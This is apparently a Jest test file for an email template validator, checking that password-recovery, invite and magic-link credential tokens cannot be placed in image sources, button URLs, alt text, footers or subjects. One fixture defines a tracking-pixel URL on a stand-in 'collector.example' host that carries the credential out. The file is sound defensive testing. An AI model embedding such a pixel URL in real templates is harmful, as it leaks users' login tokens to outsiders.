import {
  EMAIL_TEMPLATE_EVENTS,
  getEmailTemplateDefinition,
  type EmailTemplateBlockNode,
} from "@repo/email-templates";

import { EmailTemplateValidationService } from "./email-template-validation.service";

const service = new EmailTemplateValidationService();
const events = [
  EMAIL_TEMPLATE_EVENTS.PASSWORD_RECOVERY,
  EMAIL_TEMPLATE_EVENTS.PASSWORD_REMINDER,
  EMAIL_TEMPLATE_EVENTS.USER_INVITE,
  EMAIL_TEMPLATE_EVENTS.MAGIC_LINK,
];

describe.each(events)("Credential confinement for %s", (event) => {
  const definition = getEmailTemplateDefinition(event);
  const key = definition.variables.find((variable) => variable.requiredInTemplate)!.key;
  const token = `{{ ${key} }}`;
  const external = `https://collector.example/pixel?credential=${token}`;
  const cases: EmailTemplateBlockNode[] = [
    { type: "image", attrs: { src: external, alt: "" } },
    { type: "image", attrs: { src: token, alt: "" } },
    { type: "image", attrs: { src: "https://example.com/image.png", alt: token } },
    { type: "button", attrs: { label: "Open", url: external } },
    { type: "button", attrs: { label: token, url: "https://example.com" } },
    {
      type: "text",
      content: [
        {
          type: "paragraph",
          content: [
            { type: "text", text: "Open", marks: [{ type: "link", attrs: { href: external } }] },
          ],
        },
      ],
    },
    {
      type: "text",
      content: [
        {
          type: "paragraph",
          content: [
            { type: "text", text: "{{ " },
            { type: "text", text: `${key} }}`, marks: [{ type: "bold" }] },
          ],
        },
      ],
    },
    { type: "footer", attrs: { text: token } },
  ];

  it.each(cases)("rejects credential exposure even with a valid required action: %j", (block) => {
    const document = structuredClone(definition.defaultDocuments.en);
    document.content.push(block);
    expect(() =>
      service.validatePublished(
        event,
        definition.name,
        definition.subjects,
        { en: document },
        "en",
      ),
    ).toThrow("emailTemplates.errors.restrictedAuthVariables");
    expect(() =>
      service.validateRuntimeVariables(event, document, service.getSampleVariables(event)),
    ).toThrow("emailTemplates.errors.restrictedAuthVariables");
  });

  it("rejects subject exposure on save and for previously published templates", () => {
    expect(() => service.validateDraft(event, { en: token }, definition.defaultDocuments)).toThrow(
      "emailTemplates.errors.restrictedAuthVariables",
    );
    expect(() =>
      service.validateRuntimeVariables(
        event,
        definition.defaultDocuments.en,
        service.getSampleVariables(event),
        token,
      ),
    ).toThrow("emailTemplates.errors.restrictedAuthVariables");
  });

  it("allows standalone text links and ordinary external images without mutating the document", () => {
    const document = structuredClone(definition.defaultDocuments.en);
    document.content = document.content.filter((block) => block.type !== "button");
    document.content.push(
      {
        type: "text",
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "Open account",
                marks: [{ type: "link", attrs: { href: token } }],
              },
            ],
          },
        ],
      },
      { type: "image", attrs: { src: "https://example.com/logo.png", alt: "Logo" } },
    );
    const before = structuredClone(document);
    expect(() =>
      service.validatePublished(
        event,
        definition.name,
        definition.subjects,
        { en: document },
        "en",
      ),
    ).not.toThrow();
    expect(() =>
      service.validateRuntimeVariables(event, document, service.getSampleVariables(event)),
    ).not.toThrow();
    expect(document).toEqual(before);
  });
});
